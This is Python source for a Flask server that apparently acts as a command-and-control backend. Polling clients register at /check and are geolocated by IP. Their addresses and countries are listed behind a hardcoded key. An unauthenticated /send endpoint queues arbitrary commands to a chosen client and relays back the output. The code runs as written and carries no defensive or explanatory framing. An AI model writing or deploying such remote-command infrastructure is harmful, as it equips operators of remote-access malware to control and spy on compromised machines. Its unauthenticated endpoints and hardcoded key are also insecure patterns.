#!/usr/bin/env python3
import ipaddress
import json
import ssl
import requests
from flask import Flask, request, jsonify, abort
import threading
from uuid import uuid4
import time
from flask_cors import CORS
from datetime import datetime, timezone
from gevent.pywsgi import WSGIServer



clients = {}
lock_clients = threading.Lock()

pending_requests = {}
lock_pending = threading.Lock()

app = Flask(__name__)
CORS(app)

def client_cleaner():
    """Background thread to remove inactive clients"""
    while True:
        time.sleep(60)  # Run every minute
        now = time.time()
        with lock_clients:
            to_remove = []
            for client_id, client in list(clients.items()):
                if now - client['last_seen'] > 300:  # 5 minutes timeout
                    to_remove.append(client_id)
            
            for client_id in to_remove:
                print(f"Removing inactive client: {client_id}")
                del clients[client_id]



def get_client_ip(req):
    """Get client IP with proxy support"""
    # Check common proxy headers
    for header in ('X-Forwarded-For', 'X-Real-IP', 'CF-Connecting-IP'):
        ip = req.headers.get(header)
        if ip:
            # Handle comma-separated lists
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            try:
                # Validate IP format
                ipaddress.ip_address(ip)
                return ip
            except ValueError:
                continue
    
    # Fall back to remote_addr
    return req.remote_addr or "0.0.0.0"

IPINFO_TIMEOUT = 2
CLIENT_TIMEOUT = 60  

@app.route('/clients', methods=['GET'])
def list_clients():
    """List connected clients (protected endpoint)"""
    if request.args.get('key') != 'abhsj223':
        abort(403, description="Invalid access key")
    
    with lock_clients:
        # Clean up stale clients first
        current_time = time.time()
        stale_clients = [
            client_id for client_id, client in clients.items()
            if current_time - client['last_seen'] > CLIENT_TIMEOUT
        ]
        for client_id in stale_clients:
            del clients[client_id]
        
        result = []
        for client_id, client in clients.items():
            result.append({
                'id': client_id,
                "status": 'active',
                'ip': client['ip'],  # Consider masking part of IP if privacy is a concern
                'country': client['country'],
                'updated_date': datetime.fromtimestamp(
                    client['last_seen'], timezone.utc
                ).isoformat()
            })
    
    return jsonify(result)

@app.route('/check', methods=['POST'])
def check_command():
    """Client polls this endpoint to check for commands"""
    data = request.get_json()
    if not data or 'client_id' not in data:
        return jsonify(error="Missing client_id"), 400

    
    client_id = data['client_id']
    if not isinstance(client_id, str):
        try:
            client_id = str(client_id['value'])
        except Exception:
            return jsonify(error="Invalid client_id format"), 400
    ip = get_client_ip(request)
    
    with lock_clients:
        # Only do country lookup for new clients
        if client_id not in clients:
            country = "Unknown"
            try:
                response = requests.get(
                    f"http://ipinfo.io/{ip}/json",
                    timeout=IPINFO_TIMEOUT
                )
                if response.status_code == 200:
                    country = response.json().get("country", "Unknown")
            except Exception:
                pass
            
            print(f"New client registered: {client_id} from {ip} ({country})")
            clients[client_id] = {
                "ip": ip,
                "country": country,
                "last_seen": time.time(),
                "command_queue": [],
                "condition": threading.Condition(),
            }
        else:
            clients[client_id]["last_seen"] = time.time()
            # Only update IP if it's changed
            if clients[client_id]["ip"] != ip:
                clients[client_id]["ip"] = ip

        client = clients[client_id]
    
    # Wait for command with timeout
    with client["condition"]:
        if not client["command_queue"]:
            client["condition"].wait(timeout=30)  # Long-poll timeout

        if client["command_queue"]:
            command = client["command_queue"].pop(0)
            return jsonify(command)

    return jsonify({})  # Empty response if no commands



@app.route('/response', methods=['POST'])
def handle_response():
    """Client sends command responses to this endpoint"""
    data = request.get_json()
    if not data or 'client_id' not in data or 'request_id' not in data:
        return jsonify(success=False, error="Missing parameters"), 400

    client_id = data['client_id']
    if not isinstance(client_id, str):
        # Try to convert to string if it's a different type
        try:
            client_id = str(client_id)
        except:
            return jsonify(error="Invalid client_id format"), 400
    request_id = data['request_id']
    response = data.get('response', '')
    
    with lock_clients:
        if client_id in clients:
            clients[client_id]['last_seen'] = time.time()
    
    with lock_pending:
        if request_id in pending_requests:
            event, response_container = pending_requests[request_id]
            response_container['response'] = response
            event.set()
            return jsonify(success=True)
    
    return jsonify(success=False, error="Invalid request_id"), 404

@app.route('/send', methods=['POST'])
def api_send():
    """API endpoint to send commands to clients"""
    data = request.get_json()
    if not data or 'client_id' not in data or 'message' not in data:
        return jsonify(success=False, error="Missing parameters"), 400

    client_id = data['client_id']
    message = data['message']
    request_id = str(uuid4())

    # Create response tracking objects
    response_event = threading.Event()
    response_container = {'response': None}
    
    with lock_pending:
        pending_requests[request_id] = (response_event, response_container)
    
    # Add command to client's queue
    with lock_clients:
        if client_id not in clients:
            with lock_pending:
                del pending_requests[request_id]
            return jsonify(success=False, error="Client not connected"), 404
        
        client = clients[client_id]
        with client['condition']:
            client['command_queue'].append({
                'request_id': request_id,
                'command': message
            })
            client['condition'].notify()
    
    # Wait for response
    response_event.wait(timeout=15)
    
    with lock_pending:
        if request_id in pending_requests:
            response = pending_requests[request_id][1]['response']
            del pending_requests[request_id]
            if response is not None:
                return jsonify(success=True, response=response)
    
    return jsonify(success=False, error="Timeout waiting for response"), 504





@app.route('/remove-clients', methods=['POST'])
def remove_clients():
    try:
        data = request.get_json()
        client_ids = data.get('client_ids', [])
        
        if not client_ids:
            return jsonify({"success": False, "error": "No client IDs provided"}), 400

        # Remove messages for these clients

        with lock_clients:
            for client_id in client_ids:
                if client_id in clients:
                    del clients[client_id]
        

        return jsonify({
            "success": True,
            "message": f"Successfully removed {len(client_ids)} clients"
        })

    except Exception as e:
        return jsonify({
            "success": False,
            "error": str(e)
        }), 500


   
def runDebug():
    try:
        threading.Thread(target=client_cleaner, daemon=True).start()
        print("API server started on http://0.0.0.0:4000")
        app.run(host='0.0.0.0', port=4000, threaded=True)
    except KeyboardInterrupt:
        print('Server stopped')


def runRelease():
    try:
        context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        try:
            context.load_cert_chain(certfile="certificate.crt", keyfile="private.key")
        except Exception as e:
            app.logger.error(f"Error loading SSL certificate: {e}")
            exit(1)

        threading.Thread(target=client_cleaner, daemon=True).start()

        # Create and start the Gevent WSGI server with SSL
        http_server = WSGIServer(('0.0.0.0', 4000), app, ssl_context=context)
    
        app.logger.info("Starting secure WSGI server on port 443...")
        http_server.serve_forever()
    except KeyboardInterrupt:
        app.logger.info("Server stopped")